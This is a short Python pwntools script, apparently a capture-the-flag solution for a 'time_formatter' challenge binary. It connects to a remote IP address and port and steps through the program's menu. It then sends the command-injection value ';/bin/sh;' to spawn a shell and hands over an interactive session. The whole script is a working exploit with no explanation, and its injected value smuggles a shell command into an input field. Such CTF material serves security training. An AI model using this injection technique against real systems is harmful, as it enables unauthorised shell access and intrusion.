from pwn import *

context.log_level = "debug"
# r = process("./time_formatter")
r = remote("111.200.241.244", 54283)

r.sendlineafter(b"> ", b"1")
r.sendline(b"aa")
r.sendlineafter(b"> ", b"5")
r.sendline(b"N")
r.sendlineafter(b"> ", b"3")
r.sendline(b"';/bin/sh;'")
r.sendline(b"4")
r.interactive()